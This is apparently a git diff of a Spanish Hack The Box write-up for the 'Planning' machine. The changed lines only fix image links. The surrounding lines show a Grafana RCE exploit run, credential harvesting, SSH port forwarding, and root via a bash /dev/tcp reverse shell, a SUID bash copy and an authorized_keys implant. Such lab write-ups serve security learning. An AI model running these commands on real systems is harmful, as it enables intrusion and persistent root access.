@@ -99,7 +99,7 @@ Ejecutamos el exploit y obtenemos una `reverse shell` como root.
 python3 reverse.py --url http://grafana.planning.htb/ --username "admin" --password "0D5oT70Fq13EvB5r" --reverse-ip 10.10.16.19 --reverse-port 1337
 ```
 
-[Reverse shell](images/planning_exploit.PNG)
+![Reverse shell](images/planning_exploit.PNG)
 
 [Github-CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
 
@@ -119,16 +119,16 @@ stty rows 40 columns 184
 ### Post-Explotación
 Viendo el nombre del `hostname 7ce659d667d7` ya se puede intuir que estamos es un `contenedor docker`, para confirmalo vemos quien es el proceso 1 (en este caso `Grafana` ha sido la aplicación que se lanzó con el contenedor).
 
-[Proceso 1](images/planning_process_1.PNG)
+![Proceso 1](images/planning_process_1.PNG)
 
 #### LinPEAS
 Utilicé `LinPEAS` para enumerar posibles vectores de escalada, aunque lo primero es `subirlo al contenedor`.
 
-[Subir LinPEAS](images/planning_linpeas.PNG)
+![Subir LinPEAS](images/planning_linpeas.PNG)
 
 Encontrando las credenciales para `enzo:RioTecRANDEntANT!` en las variables de entorno (sin linPEAS, con env o printenv).
 
-[Subir LinPEAS](images/planning_linpeas_env.PNG)
+![Subir LinPEAS](images/planning_linpeas_env.PNG)
 
 #### SSH
 Nos conectamos por SSH con el usuario enzo.
@@ -137,14 +137,14 @@ Nos conectamos por SSH con el usuario enzo.
 ssh enzo@10.10.11.68
 ```
 
-[SSH 1](images/planning_ssh_enzo1.PNG)
-[SSH 2](images/planning_ssh_enzo2.PNG)
+![SSH 1](images/planning_ssh_enzo1.PNG)
+![SSH 2](images/planning_ssh_enzo2.PNG)
 
 #### Escalada a root
 Buscando servicios internos con `netstat -ano`, me encontré con grafana escuchando en el 3000 [Grafana docs](https://grafana.com/docs/grafana/latest/setup-grafana/start-restart-grafana/#docker-compose-example) y otro servicio en el 8000, pero requería autenticación.
 
-[NetStat](images/planning_conexiones_locales.PNG)
-[Servicio desconocido](images/planning_servicio_desconocido.PNG)
+![NetStat](images/planning_conexiones_locales.PNG)
+![Servicio desconocido](images/planning_servicio_desconocido.PNG)
 
 Tras investigar el sistema un rato, me encontré el archivo `crontab.db` en la ruta `/opt/crontab/crontab.db`. Al parecer hay una tarea programada en JSON que ejecuta un backup diario de un contenedor docker, donde guarda la imagen `root_grafana` en un grafana.tar y después la comprime en un .zip protegido con la contraseña `P4ssw0rdS0pRi0T3c`.
 
@@ -156,7 +156,7 @@ curl -u root_grafana:P4ssw0rdS0pRi0c http://localhost:8000/ -v
 curl -u root:P4ssw0rdS0pRi0c http://localhost:8000/ -v
 ```
 
-[Autenticado contra el servicio desconocido](images/planning_autenticacion_servicio_desconocido.PNG)
+![Autenticado contra el servicio desconocido](images/planning_autenticacion_servicio_desconocido.PNG)
 
 #### Port Forwarding
 Para comprender mejor que hay ahí vamos a redirigir el trafico desde un puerto de mi máquina local hacia el puerto donde está corriendo este servicio en la maquina remota.
@@ -164,7 +164,7 @@ Para comprender mejor que hay ahí vamos a redirigir el trafico desde un puerto 
 ```bash
 ssh -L 8080:127.0.0.1:8000 enzo@10.10.11.68
 ```
-[Port Forwarding](images/planning_port_forwarding.PNG)
+![Port Forwarding](images/planning_port_forwarding.PNG)
 
 #### Crontab UI
 El servicio que corre en localhost:8000 es un Crontab UI desde donde se puede ejecutar comandos como root.
@@ -175,22 +175,22 @@ Maneras de convertirnos en root:
 bash -c 'bash -i >& /dev/tcp/10.10.16.19/1337 0>&1'
 ```
 
-[Root - Simple reverse](images/planning_crontab_simple_reverse.PNG)
+![Root - Simple reverse](images/planning_crontab_simple_reverse.PNG)
 
 ```bash
 cp /bin/bash /usr/local/bin/upupup && chmod 4755 /usr/local/bin/upupup
 cp /bin/bash /usr/local/bin/upupup && chmod u+s /usr/local/bin/upupup
 ```
 
-[Root - Bit SUID](images/planning_crontab_suid_shell.PNG)
+![Root - Bit SUID](images/planning_crontab_suid_shell.PNG)
 
 ```bash
 echo 'ssh-rsa AAAAB3Nz...LJzNu/ZQ== kali@kali' > /root/.ssh/authorized_keys
 ```
 
-[Root - SSH authorized_keys](images/planning_crontab_ssh_pub.PNG)
+![Root - SSH authorized_keys](images/planning_crontab_ssh_pub.PNG)
 
 ### Limpieza del entorno
 Una vez terminada la máquina, recuerda limpiar todos los archivos creados para mantener el entorno limpio.
 
-[Limpieza](images/planning_limpieza_entorno.PNG)
+![Limpieza](images/planning_limpieza_entorno.PNG)
